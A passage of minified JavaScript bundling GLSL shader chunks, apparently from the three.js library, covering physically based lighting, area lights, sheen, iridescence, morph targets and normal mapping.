	float f90 = material.specularF90;
	float roughness = material.roughness;
	float alpha = pow2( roughness );
	vec3 halfDir = normalize( lightDir + viewDir );
	float dotNL = saturate( dot( normal, lightDir ) );
	float dotNV = saturate( dot( normal, viewDir ) );
	float dotNH = saturate( dot( normal, halfDir ) );
	float dotVH = saturate( dot( viewDir, halfDir ) );
	vec3 F = F_Schlick( f0, f90, dotVH );
	#ifdef USE_IRIDESCENCE
		F = mix( F, material.iridescenceFresnel, material.iridescence );
	#endif
	#ifdef USE_ANISOTROPY
		float dotTL = dot( material.anisotropyT, lightDir );
		float dotTV = dot( material.anisotropyT, viewDir );
		float dotTH = dot( material.anisotropyT, halfDir );
		float dotBL = dot( material.anisotropyB, lightDir );
		float dotBV = dot( material.anisotropyB, viewDir );
		float dotBH = dot( material.anisotropyB, halfDir );
		float V = V_GGX_SmithCorrelated_Anisotropic( material.alphaT, alpha, dotTV, dotBV, dotTL, dotBL, dotNV, dotNL );
		float D = D_GGX_Anisotropic( material.alphaT, alpha, dotNH, dotTH, dotBH );
	#else
		float V = V_GGX_SmithCorrelated( alpha, dotNL, dotNV );
		float D = D_GGX( alpha, dotNH );
	#endif
	return F * ( V * D );
}
vec2 LTC_Uv( const in vec3 N, const in vec3 V, const in float roughness ) {
	const float LUT_SIZE = 64.0;
	const float LUT_SCALE = ( LUT_SIZE - 1.0 ) / LUT_SIZE;
	const float LUT_BIAS = 0.5 / LUT_SIZE;
	float dotNV = saturate( dot( N, V ) );
	vec2 uv = vec2( roughness, sqrt( 1.0 - dotNV ) );
	uv = uv * LUT_SCALE + LUT_BIAS;
	return uv;
}
float LTC_ClippedSphereFormFactor( const in vec3 f ) {
	float l = length( f );
	return max( ( l * l + f.z ) / ( l + 1.0 ), 0.0 );
}
vec3 LTC_EdgeVectorFormFactor( const in vec3 v1, const in vec3 v2 ) {
	float x = dot( v1, v2 );
	float y = abs( x );
	float a = 0.8543985 + ( 0.4965155 + 0.0145206 * y ) * y;
	float b = 3.4175940 + ( 4.1616724 + y ) * y;
	float v = a / b;
	float theta_sintheta = ( x > 0.0 ) ? v : 0.5 * inversesqrt( max( 1.0 - x * x, 1e-7 ) ) - v;
	return cross( v1, v2 ) * theta_sintheta;
}
vec3 LTC_Evaluate( const in vec3 N, const in vec3 V, const in vec3 P, const in mat3 mInv, const in vec3 rectCoords[ 4 ] ) {
	vec3 v1 = rectCoords[ 1 ] - rectCoords[ 0 ];
	vec3 v2 = rectCoords[ 3 ] - rectCoords[ 0 ];
	vec3 lightNormal = cross( v1, v2 );
	if( dot( lightNormal, P - rectCoords[ 0 ] ) < 0.0 ) return vec3( 0.0 );
	vec3 T1, T2;
	T1 = normalize( V - N * dot( V, N ) );
	T2 = - cross( N, T1 );
	mat3 mat = mInv * transpose( mat3( T1, T2, N ) );
	vec3 coords[ 4 ];
	coords[ 0 ] = mat * ( rectCoords[ 0 ] - P );
	coords[ 1 ] = mat * ( rectCoords[ 1 ] - P );
	coords[ 2 ] = mat * ( rectCoords[ 2 ] - P );
	coords[ 3 ] = mat * ( rectCoords[ 3 ] - P );
	coords[ 0 ] = normalize( coords[ 0 ] );
	coords[ 1 ] = normalize( coords[ 1 ] );
	coords[ 2 ] = normalize( coords[ 2 ] );
	coords[ 3 ] = normalize( coords[ 3 ] );
	vec3 vectorFormFactor = vec3( 0.0 );
	vectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 0 ], coords[ 1 ] );
	vectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 1 ], coords[ 2 ] );
	vectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 2 ], coords[ 3 ] );
	vectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 3 ], coords[ 0 ] );
	float result = LTC_ClippedSphereFormFactor( vectorFormFactor );
	return vec3( result );
}
#if defined( USE_SHEEN )
float D_Charlie( float roughness, float dotNH ) {
	float alpha = pow2( roughness );
	float invAlpha = 1.0 / alpha;
	float cos2h = dotNH * dotNH;
	float sin2h = max( 1.0 - cos2h, 0.0078125 );
	return ( 2.0 + invAlpha ) * pow( sin2h, invAlpha * 0.5 ) / ( 2.0 * PI );
}
float V_Neubelt( float dotNV, float dotNL ) {
	return saturate( 1.0 / ( 4.0 * ( dotNL + dotNV - dotNL * dotNV ) ) );
}
vec3 BRDF_Sheen( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, vec3 sheenColor, const in float sheenRoughness ) {
	vec3 halfDir = normalize( lightDir + viewDir );
	float dotNL = saturate( dot( normal, lightDir ) );
	float dotNV = saturate( dot( normal, viewDir ) );
	float dotNH = saturate( dot( normal, halfDir ) );
	float D = D_Charlie( sheenRoughness, dotNH );
	float V = V_Neubelt( dotNV, dotNL );
	return sheenColor * ( D * V );
}
#endif
float IBLSheenBRDF( const in vec3 normal, const in vec3 viewDir, const in float roughness ) {
	float dotNV = saturate( dot( normal, viewDir ) );
	float r2 = roughness * roughness;
	float rInv = 1.0 / ( roughness + 0.1 );
	float a = -1.9362 + 1.0678 * roughness + 0.4573 * r2 - 0.8469 * rInv;
	float b = -0.6014 + 0.5538 * roughness - 0.4670 * r2 - 0.1255 * rInv;
	float DG = exp( a * dotNV + b );
	return saturate( DG );
}
vec3 EnvironmentBRDF( const in vec3 normal, const in vec3 viewDir, const in vec3 specularColor, const in float specularF90, const in float roughness ) {
	float dotNV = saturate( dot( normal, viewDir ) );
	vec2 fab = texture2D( dfgLUT, vec2( roughness, dotNV ) ).rg;
	return specularColor * fab.x + specularF90 * fab.y;
}
#ifdef USE_IRIDESCENCE
void computeMultiscatteringIridescence( const in vec3 normal, const in vec3 viewDir, const in vec3 specularColor, const in float specularF90, const in float iridescence, const in vec3 iridescenceF0, const in float roughness, inout vec3 singleScatter, inout vec3 multiScatter ) {
#else
void computeMultiscattering( const in vec3 normal, const in vec3 viewDir, const in vec3 specularColor, const in float specularF90, const in float roughness, inout vec3 singleScatter, inout vec3 multiScatter ) {
#endif
	float dotNV = saturate( dot( normal, viewDir ) );
	vec2 fab = texture2D( dfgLUT, vec2( roughness, dotNV ) ).rg;
	#ifdef USE_IRIDESCENCE
		vec3 Fr = mix( specularColor, iridescenceF0, iridescence );
	#else
		vec3 Fr = specularColor;
	#endif
	vec3 FssEss = Fr * fab.x + specularF90 * fab.y;
	float Ess = fab.x + fab.y;
	float Ems = 1.0 - Ess;
	vec3 Favg = Fr + ( 1.0 - Fr ) * 0.047619;	vec3 Fms = FssEss * Favg / ( 1.0 - Ems * Favg );
	singleScatter += FssEss;
	multiScatter += Fms * Ems;
}
vec3 BRDF_GGX_Multiscatter( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, const in PhysicalMaterial material ) {
	vec3 singleScatter = BRDF_GGX( lightDir, viewDir, normal, material );
	float dotNL = saturate( dot( normal, lightDir ) );
	float dotNV = saturate( dot( normal, viewDir ) );
	vec2 dfgV = texture2D( dfgLUT, vec2( material.roughness, dotNV ) ).rg;
	vec2 dfgL = texture2D( dfgLUT, vec2( material.roughness, dotNL ) ).rg;
	vec3 FssEss_V = material.specularColorBlended * dfgV.x + material.specularF90 * dfgV.y;
	vec3 FssEss_L = material.specularColorBlended * dfgL.x + material.specularF90 * dfgL.y;
	float Ess_V = dfgV.x + dfgV.y;
	float Ess_L = dfgL.x + dfgL.y;
	float Ems_V = 1.0 - Ess_V;
	float Ems_L = 1.0 - Ess_L;
	vec3 Favg = material.specularColorBlended + ( 1.0 - material.specularColorBlended ) * 0.047619;
	vec3 Fms = FssEss_V * FssEss_L * Favg / ( 1.0 - Ems_V * Ems_L * Favg + EPSILON );
	float compensationFactor = Ems_V * Ems_L;
	vec3 multiScatter = Fms * compensationFactor;
	return singleScatter + multiScatter;
}
#if NUM_RECT_AREA_LIGHTS > 0
	void RE_Direct_RectArea_Physical( const in RectAreaLight rectAreaLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {
		vec3 normal = geometryNormal;
		vec3 viewDir = geometryViewDir;
		vec3 position = geometryPosition;
		vec3 lightPos = rectAreaLight.position;
		vec3 halfWidth = rectAreaLight.halfWidth;
		vec3 halfHeight = rectAreaLight.halfHeight;
		vec3 lightColor = rectAreaLight.color;
		float roughness = material.roughness;
		vec3 rectCoords[ 4 ];
		rectCoords[ 0 ] = lightPos + halfWidth - halfHeight;		rectCoords[ 1 ] = lightPos - halfWidth - halfHeight;
		rectCoords[ 2 ] = lightPos - halfWidth + halfHeight;
		rectCoords[ 3 ] = lightPos + halfWidth + halfHeight;
		vec2 uv = LTC_Uv( normal, viewDir, roughness );
		vec4 t1 = texture2D( ltc_1, uv );
		vec4 t2 = texture2D( ltc_2, uv );
		mat3 mInv = mat3(
			vec3( t1.x, 0, t1.y ),
			vec3(    0, 1,    0 ),
			vec3( t1.z, 0, t1.w )
		);
		vec3 fresnel = ( material.specularColorBlended * t2.x + ( vec3( 1.0 ) - material.specularColorBlended ) * t2.y );
		reflectedLight.directSpecular += lightColor * fresnel * LTC_Evaluate( normal, viewDir, position, mInv, rectCoords );
		reflectedLight.directDiffuse += lightColor * material.diffuseContribution * LTC_Evaluate( normal, viewDir, position, mat3( 1.0 ), rectCoords );
	}
#endif
void RE_Direct_Physical( const in IncidentLight directLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {
	float dotNL = saturate( dot( geometryNormal, directLight.direction ) );
	vec3 irradiance = dotNL * directLight.color;
	#ifdef USE_CLEARCOAT
		float dotNLcc = saturate( dot( geometryClearcoatNormal, directLight.direction ) );
		vec3 ccIrradiance = dotNLcc * directLight.color;
		clearcoatSpecularDirect += ccIrradiance * BRDF_GGX_Clearcoat( directLight.direction, geometryViewDir, geometryClearcoatNormal, material );
	#endif
	#ifdef USE_SHEEN
 
 		sheenSpecularDirect += irradiance * BRDF_Sheen( directLight.direction, geometryViewDir, geometryNormal, material.sheenColor, material.sheenRoughness );
 
 		float sheenAlbedoV = IBLSheenBRDF( geometryNormal, geometryViewDir, material.sheenRoughness );
 		float sheenAlbedoL = IBLSheenBRDF( geometryNormal, directLight.direction, material.sheenRoughness );
 
 		float sheenEnergyComp = 1.0 - max3( material.sheenColor ) * max( sheenAlbedoV, sheenAlbedoL );
 
 		irradiance *= sheenEnergyComp;
 
 	#endif
	reflectedLight.directSpecular += irradiance * BRDF_GGX_Multiscatter( directLight.direction, geometryViewDir, geometryNormal, material );
	reflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseContribution );
}
void RE_IndirectDiffuse_Physical( const in vec3 irradiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in PhysicalMaterial material, inout ReflectedLight reflectedLight ) {
	vec3 diffuse = irradiance * BRDF_Lambert( material.diffuseContribution );
	#ifdef USE_SHEEN
		float sheenAlbedo = IBLSheenBRDF( geometryNormal, geometryViewDir, material.sheenRoughness );
		float sheenEnergyComp = 1.0 - max3( material.sheenColor ) * sheenAlbedo;
		diffuse *= sheenEnergyComp;
	#endif
	reflectedLight.indirectDiffuse += diffuse;
}
void RE_IndirectSpecular_Physical( const in vec3 radiance, const in vec3 irradiance, const in vec3 clearcoatRadiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in PhysicalMaterial material, inout ReflectedLight reflectedLight) {
	#ifdef USE_CLEARCOAT
		clearcoatSpecularIndirect += clearcoatRadiance * EnvironmentBRDF( geometryClearcoatNormal, geometryViewDir, material.clearcoatF0, material.clearcoatF90, material.clearcoatRoughness );
	#endif
	#ifdef USE_SHEEN
		sheenSpecularIndirect += irradiance * material.sheenColor * IBLSheenBRDF( geometryNormal, geometryViewDir, material.sheenRoughness ) * RECIPROCAL_PI;
 	#endif
	vec3 singleScatteringDielectric = vec3( 0.0 );
	vec3 multiScatteringDielectric = vec3( 0.0 );
	vec3 singleScatteringMetallic = vec3( 0.0 );
	vec3 multiScatteringMetallic = vec3( 0.0 );
	#ifdef USE_IRIDESCENCE
		computeMultiscatteringIridescence( geometryNormal, geometryViewDir, material.specularColor, material.specularF90, material.iridescence, material.iridescenceFresnelDielectric, material.roughness, singleScatteringDielectric, multiScatteringDielectric );
		computeMultiscatteringIridescence( geometryNormal, geometryViewDir, material.diffuseColor, material.specularF90, material.iridescence, material.iridescenceFresnelMetallic, material.roughness, singleScatteringMetallic, multiScatteringMetallic );
	#else
		computeMultiscattering( geometryNormal, geometryViewDir, material.specularColor, material.specularF90, material.roughness, singleScatteringDielectric, multiScatteringDielectric );
		computeMultiscattering( geometryNormal, geometryViewDir, material.diffuseColor, material.specularF90, material.roughness, singleScatteringMetallic, multiScatteringMetallic );
	#endif
	vec3 singleScattering = mix( singleScatteringDielectric, singleScatteringMetallic, material.metalness );
	vec3 multiScattering = mix( multiScatteringDielectric, multiScatteringMetallic, material.metalness );
	vec3 totalScatteringDielectric = singleScatteringDielectric + multiScatteringDielectric;
	vec3 diffuse = material.diffuseContribution * ( 1.0 - totalScatteringDielectric );
	vec3 cosineWeightedIrradiance = irradiance * RECIPROCAL_PI;
	vec3 indirectSpecular = radiance * singleScattering;
	indirectSpecular += multiScattering * cosineWeightedIrradiance;
	vec3 indirectDiffuse = diffuse * cosineWeightedIrradiance;
	#ifdef USE_SHEEN
		float sheenAlbedo = IBLSheenBRDF( geometryNormal, geometryViewDir, material.sheenRoughness );
		float sheenEnergyComp = 1.0 - max3( material.sheenColor ) * sheenAlbedo;
		indirectSpecular *= sheenEnergyComp;
		indirectDiffuse *= sheenEnergyComp;
	#endif
	reflectedLight.indirectSpecular += indirectSpecular;
	reflectedLight.indirectDiffuse += indirectDiffuse;
}
#define RE_Direct				RE_Direct_Physical
#define RE_Direct_RectArea		RE_Direct_RectArea_Physical
#define RE_IndirectDiffuse		RE_IndirectDiffuse_Physical
#define RE_IndirectSpecular		RE_IndirectSpecular_Physical
float computeSpecularOcclusion( const in float dotNV, const in float ambientOcclusion, const in float roughness ) {
	return saturate( pow( dotNV + ambientOcclusion, exp2( - 16.0 * roughness - 1.0 ) ) - 1.0 + ambientOcclusion );
}`,LE=`
vec3 geometryPosition = - vViewPosition;
vec3 geometryNormal = normal;
vec3 geometryViewDir = ( isOrthographic ) ? vec3( 0, 0, 1 ) : normalize( vViewPosition );
vec3 geometryClearcoatNormal = vec3( 0.0 );
#ifdef USE_CLEARCOAT
	geometryClearcoatNormal = clearcoatNormal;
#endif
#ifdef USE_IRIDESCENCE
	float dotNVi = saturate( dot( normal, geometryViewDir ) );
	if ( material.iridescenceThickness == 0.0 ) {
		material.iridescence = 0.0;
	} else {
		material.iridescence = saturate( material.iridescence );
	}
	if ( material.iridescence > 0.0 ) {
		material.iridescenceFresnelDielectric = evalIridescence( 1.0, material.iridescenceIOR, dotNVi, material.iridescenceThickness, material.specularColor );
		material.iridescenceFresnelMetallic = evalIridescence( 1.0, material.iridescenceIOR, dotNVi, material.iridescenceThickness, material.diffuseColor );
		material.iridescenceFresnel = mix( material.iridescenceFresnelDielectric, material.iridescenceFresnelMetallic, material.metalness );
		material.iridescenceF0 = Schlick_to_F0( material.iridescenceFresnel, 1.0, dotNVi );
	}
#endif
IncidentLight directLight;
#if ( NUM_POINT_LIGHTS > 0 ) && defined( RE_Direct )
	PointLight pointLight;
	#if defined( USE_SHADOWMAP ) && NUM_POINT_LIGHT_SHADOWS > 0
	PointLightShadow pointLightShadow;
	#endif
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {
		pointLight = pointLights[ i ];
		getPointLightInfo( pointLight, geometryPosition, directLight );
		#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_POINT_LIGHT_SHADOWS ) && ( defined( SHADOWMAP_TYPE_PCF ) || defined( SHADOWMAP_TYPE_BASIC ) )
		pointLightShadow = pointLightShadows[ i ];
		directLight.color *= ( directLight.visible && receiveShadow ) ? getPointShadow( pointShadowMap[ i ], pointLightShadow.shadowMapSize, pointLightShadow.shadowIntensity, pointLightShadow.shadowBias, pointLightShadow.shadowRadius, vPointShadowCoord[ i ], pointLightShadow.shadowCameraNear, pointLightShadow.shadowCameraFar ) : 1.0;
		#endif
		RE_Direct( directLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if ( NUM_SPOT_LIGHTS > 0 ) && defined( RE_Direct )
	SpotLight spotLight;
	vec4 spotColor;
	vec3 spotLightCoord;
	bool inSpotLightMap;
	#if defined( USE_SHADOWMAP ) && NUM_SPOT_LIGHT_SHADOWS > 0
	SpotLightShadow spotLightShadow;
	#endif
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {
		spotLight = spotLights[ i ];
		getSpotLightInfo( spotLight, geometryPosition, directLight );
		#if ( UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS_WITH_MAPS )
		#define SPOT_LIGHT_MAP_INDEX UNROLLED_LOOP_INDEX
		#elif ( UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS )
		#define SPOT_LIGHT_MAP_INDEX NUM_SPOT_LIGHT_MAPS
		#else
		#define SPOT_LIGHT_MAP_INDEX ( UNROLLED_LOOP_INDEX - NUM_SPOT_LIGHT_SHADOWS + NUM_SPOT_LIGHT_SHADOWS_WITH_MAPS )
		#endif
		#if ( SPOT_LIGHT_MAP_INDEX < NUM_SPOT_LIGHT_MAPS )
			spotLightCoord = vSpotLightCoord[ i ].xyz / vSpotLightCoord[ i ].w;
			inSpotLightMap = all( lessThan( abs( spotLightCoord * 2. - 1. ), vec3( 1.0 ) ) );
			spotColor = texture2D( spotLightMap[ SPOT_LIGHT_MAP_INDEX ], spotLightCoord.xy );
			directLight.color = inSpotLightMap ? directLight.color * spotColor.rgb : directLight.color;
		#endif
		#undef SPOT_LIGHT_MAP_INDEX
		#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_SPOT_LIGHT_SHADOWS )
		spotLightShadow = spotLightShadows[ i ];
		directLight.color *= ( directLight.visible && receiveShadow ) ? getShadow( spotShadowMap[ i ], spotLightShadow.shadowMapSize, spotLightShadow.shadowIntensity, spotLightShadow.shadowBias, spotLightShadow.shadowRadius, vSpotLightCoord[ i ] ) : 1.0;
		#endif
		RE_Direct( directLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if ( NUM_DIR_LIGHTS > 0 ) && defined( RE_Direct )
	DirectionalLight directionalLight;
	#if defined( USE_SHADOWMAP ) && NUM_DIR_LIGHT_SHADOWS > 0
	DirectionalLightShadow directionalLightShadow;
	#endif
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {
		directionalLight = directionalLights[ i ];
		getDirectionalLightInfo( directionalLight, directLight );
		#if defined( USE_SHADOWMAP ) && ( UNROLLED_LOOP_INDEX < NUM_DIR_LIGHT_SHADOWS )
		directionalLightShadow = directionalLightShadows[ i ];
		directLight.color *= ( directLight.visible && receiveShadow ) ? getShadow( directionalShadowMap[ i ], directionalLightShadow.shadowMapSize, directionalLightShadow.shadowIntensity, directionalLightShadow.shadowBias, directionalLightShadow.shadowRadius, vDirectionalShadowCoord[ i ] ) : 1.0;
		#endif
		RE_Direct( directLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if ( NUM_RECT_AREA_LIGHTS > 0 ) && defined( RE_Direct_RectArea )
	RectAreaLight rectAreaLight;
	#pragma unroll_loop_start
	for ( int i = 0; i < NUM_RECT_AREA_LIGHTS; i ++ ) {
		rectAreaLight = rectAreaLights[ i ];
		RE_Direct_RectArea( rectAreaLight, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
	}
	#pragma unroll_loop_end
#endif
#if defined( RE_IndirectDiffuse )
	vec3 iblIrradiance = vec3( 0.0 );
	vec3 irradiance = getAmbientLightIrradiance( ambientLightColor );
	#if defined( USE_LIGHT_PROBES )
		irradiance += getLightProbeIrradiance( lightProbe, geometryNormal );
	#endif
	#if ( NUM_HEMI_LIGHTS > 0 )
		#pragma unroll_loop_start
		for ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {
			irradiance += getHemisphereLightIrradiance( hemisphereLights[ i ], geometryNormal );
		}
		#pragma unroll_loop_end
	#endif
#endif
#if defined( RE_IndirectSpecular )
	vec3 radiance = vec3( 0.0 );
	vec3 clearcoatRadiance = vec3( 0.0 );
#endif`,PE=`#if defined( RE_IndirectDiffuse )
	#ifdef USE_LIGHTMAP
		vec4 lightMapTexel = texture2D( lightMap, vLightMapUv );
		vec3 lightMapIrradiance = lightMapTexel.rgb * lightMapIntensity;
		irradiance += lightMapIrradiance;
	#endif
	#if defined( USE_ENVMAP ) && defined( STANDARD ) && defined( ENVMAP_TYPE_CUBE_UV )
		iblIrradiance += getIBLIrradiance( geometryNormal );
	#endif
#endif
#if defined( USE_ENVMAP ) && defined( RE_IndirectSpecular )
	#ifdef USE_ANISOTROPY
		radiance += getIBLAnisotropyRadiance( geometryViewDir, geometryNormal, material.roughness, material.anisotropyB, material.anisotropy );
	#else
		radiance += getIBLRadiance( geometryViewDir, geometryNormal, material.roughness );
	#endif
	#ifdef USE_CLEARCOAT
		clearcoatRadiance += getIBLRadiance( geometryViewDir, geometryClearcoatNormal, material.clearcoatRoughness );
	#endif
#endif`,NE=`#if defined( RE_IndirectDiffuse )
	RE_IndirectDiffuse( irradiance, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
#endif
#if defined( RE_IndirectSpecular )
	RE_IndirectSpecular( radiance, iblIrradiance, clearcoatRadiance, geometryPosition, geometryNormal, geometryViewDir, geometryClearcoatNormal, material, reflectedLight );
#endif`,IE=`#if defined( USE_LOGARITHMIC_DEPTH_BUFFER )
	gl_FragDepth = vIsPerspective == 0.0 ? gl_FragCoord.z : log2( vFragDepth ) * logDepthBufFC * 0.5;
#endif`,DE=`#if defined( USE_LOGARITHMIC_DEPTH_BUFFER )
	uniform float logDepthBufFC;
	varying float vFragDepth;
	varying float vIsPerspective;
#endif`,UE=`#ifdef USE_LOGARITHMIC_DEPTH_BUFFER
	varying float vFragDepth;
	varying float vIsPerspective;
#endif`,OE=`#ifdef USE_LOGARITHMIC_DEPTH_BUFFER
	vFragDepth = 1.0 + gl_Position.w;
	vIsPerspective = float( isPerspectiveMatrix( projectionMatrix ) );
#endif`,FE=`#ifdef USE_MAP
	vec4 sampledDiffuseColor = texture2D( map, vMapUv );
	#ifdef DECODE_VIDEO_TEXTURE
		sampledDiffuseColor = sRGBTransferEOTF( sampledDiffuseColor );
	#endif
	diffuseColor *= sampledDiffuseColor;
#endif`,BE=`#ifdef USE_MAP
	uniform sampler2D map;
#endif`,zE=`#if defined( USE_MAP ) || defined( USE_ALPHAMAP )
	#if defined( USE_POINTS_UV )
		vec2 uv = vUv;
	#else
		vec2 uv = ( uvTransform * vec3( gl_PointCoord.x, 1.0 - gl_PointCoord.y, 1 ) ).xy;
	#endif
#endif
#ifdef USE_MAP
	diffuseColor *= texture2D( map, uv );
#endif
#ifdef USE_ALPHAMAP
	diffuseColor.a *= texture2D( alphaMap, uv ).g;
#endif`,VE=`#if defined( USE_POINTS_UV )
	varying vec2 vUv;
#else
	#if defined( USE_MAP ) || defined( USE_ALPHAMAP )
		uniform mat3 uvTransform;
	#endif
#endif
#ifdef USE_MAP
	uniform sampler2D map;
#endif
#ifdef USE_ALPHAMAP
	uniform sampler2D alphaMap;
#endif`,HE=`float metalnessFactor = metalness;
#ifdef USE_METALNESSMAP
	vec4 texelMetalness = texture2D( metalnessMap, vMetalnessMapUv );
	metalnessFactor *= texelMetalness.b;
#endif`,GE=`#ifdef USE_METALNESSMAP
	uniform sampler2D metalnessMap;
#endif`,WE=`#ifdef USE_INSTANCING_MORPH
	float morphTargetInfluences[ MORPHTARGETS_COUNT ];
	float morphTargetBaseInfluence = texelFetch( morphTexture, ivec2( 0, gl_InstanceID ), 0 ).r;
	for ( int i = 0; i < MORPHTARGETS_COUNT; i ++ ) {
		morphTargetInfluences[i] =  texelFetch( morphTexture, ivec2( i + 1, gl_InstanceID ), 0 ).r;
	}
#endif`,jE=`#if defined( USE_MORPHCOLORS )
	vColor *= morphTargetBaseInfluence;
	for ( int i = 0; i < MORPHTARGETS_COUNT; i ++ ) {
		#if defined( USE_COLOR_ALPHA )
			if ( morphTargetInfluences[ i ] != 0.0 ) vColor += getMorph( gl_VertexID, i, 2 ) * morphTargetInfluences[ i ];
		#elif defined( USE_COLOR )
			if ( morphTargetInfluences[ i ] != 0.0 ) vColor += getMorph( gl_VertexID, i, 2 ).rgb * morphTargetInfluences[ i ];
		#endif
	}
#endif`,XE=`#ifdef USE_MORPHNORMALS
	objectNormal *= morphTargetBaseInfluence;
	for ( int i = 0; i < MORPHTARGETS_COUNT; i ++ ) {
		if ( morphTargetInfluences[ i ] != 0.0 ) objectNormal += getMorph( gl_VertexID, i, 1 ).xyz * morphTargetInfluences[ i ];
	}
#endif`,qE=`#ifdef USE_MORPHTARGETS
	#ifndef USE_INSTANCING_MORPH
		uniform float morphTargetBaseInfluence;
		uniform float morphTargetInfluences[ MORPHTARGETS_COUNT ];
	#endif
	uniform sampler2DArray morphTargetsTexture;
	uniform ivec2 morphTargetsTextureSize;
	vec4 getMorph( const in int vertexIndex, const in int morphTargetIndex, const in int offset ) {
		int texelIndex = vertexIndex * MORPHTARGETS_TEXTURE_STRIDE + offset;
		int y = texelIndex / morphTargetsTextureSize.x;
		int x = texelIndex - y * morphTargetsTextureSize.x;
		ivec3 morphUV = ivec3( x, y, morphTargetIndex );
		return texelFetch( morphTargetsTexture, morphUV, 0 );
	}
#endif`,YE=`#ifdef USE_MORPHTARGETS
	transformed *= morphTargetBaseInfluence;
	for ( int i = 0; i < MORPHTARGETS_COUNT; i ++ ) {
		if ( morphTargetInfluences[ i ] != 0.0 ) transformed += getMorph( gl_VertexID, i, 0 ).xyz * morphTargetInfluences[ i ];
	}
#endif`,$E=`float faceDirection = gl_FrontFacing ? 1.0 : - 1.0;
#ifdef FLAT_SHADED
	vec3 fdx = dFdx( vViewPosition );
	vec3 fdy = dFdy( vViewPosition );
	vec3 normal = normalize( cross( fdx, fdy ) );
#else
	vec3 normal = normalize( vNormal );
	#ifdef DOUBLE_SIDED
		normal *= faceDirection;
	#endif
#endif
#if defined( USE_NORMALMAP_TANGENTSPACE ) || defined( USE_CLEARCOAT_NORMALMAP ) || defined( USE_ANISOTROPY )
	#ifdef USE_TANGENT
		mat3 tbn = mat3( normalize( vTangent ), normalize( vBitangent ), normal );
	#else
		mat3 tbn = getTangentFrame( - vViewPosition, normal,
		#if defined( USE_NORMALMAP )
			vNormalMapUv
		#elif defined( USE_CLEARCOAT_NORMALMAP )
			vClearcoatNormalMapUv
		#else
			vUv
		#endif
		);
	#endif
	#if defined( DOUBLE_SIDED ) && ! defined( FLAT_SHADED )
		tbn[0] *= faceDirection;
		tbn[1] *= faceDirection;
	#endif
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	#ifdef USE_TANGENT
		mat3 tbn2 = mat3( normalize( vTangent ), normalize( vBitangent ), normal );
	#else
		mat3 tbn2 = getTangentFrame( - vViewPosition, normal, vClearcoatNormalMapUv );
	#endif
	#if defined( DOUBLE_SIDED ) && ! defined( FLAT_SHADED )
		tbn2[0] *= faceDirection;
		tbn2[1] *= faceDirection;
	#endif
#endif
vec3 nonPerturbedNormal = normal;`,KE=`#ifdef USE_NORMALMAP_OBJECTSPACE
	normal = texture2D( normalMap, vNormalMapUv ).xyz * 2.0 - 1.0;
	#ifdef FLIP_SIDED
		normal = - normal;
	#endif
	#ifdef DOUBLE_SIDED
		normal = normal * faceDirection;
	#endif
	normal = normalize( normalMatrix * normal );
#elif defined( USE_NORMALMAP_TANGENTSPACE )
	vec3 mapN = texture2D( normalMap, vNormalMapUv ).xyz * 2.0 - 1.0;
	mapN.xy *= normalScale;
	normal = normalize( tbn * mapN );
#elif defined( USE_BUMPMAP )
	normal = perturbNormalArb( - vViewPosition, normal, dHdxy_fwd(), faceDirection );
#endif`,ZE=`#ifndef FLAT_SHADED
	varying vec3 vNormal;
	#ifdef USE_TANGENT
		varying vec3 vTangent;
		varying vec3 vBitangent;
	#endif
#endif`,JE=`#ifndef FLAT_SHADED
	varying vec3 vNormal;
	#ifdef USE_TANGENT
		varying vec3 vTangent;
		varying vec3 vBitangent;
	#endif
#endif`,QE=`#ifndef FLAT_SHADED
	vNormal = normalize( transformedNormal );
	#ifdef USE_TANGENT
		vTangent = normalize( transformedTangent );
		vBitangent = normalize( cross( vNormal, vTangent ) * tangent.w );
	#endif
#endif`,e1=`#ifdef USE_NORMALMAP
	uniform sampler2D normalMap;
	uniform vec2 normalScale;
#endif
#ifdef USE_NORMALMAP_OBJECTSPACE
	uniform mat3 normalMatrix;
#endif
#if ! defined ( USE_TANGENT ) && ( defined ( USE_NORMALMAP_TANGENTSPACE ) || defined ( USE_CLEARCOAT_NORMALMAP ) || defined( USE_ANISOTROPY ) )
	mat3 getTangentFrame( vec3 eye_pos, vec3 surf_norm, vec2 uv ) {
		vec3 q0 = dFdx( eye_pos.xyz );
		vec3 q1 = dFdy( eye_pos.xyz );
		vec2 st0 = dFdx( uv.st );
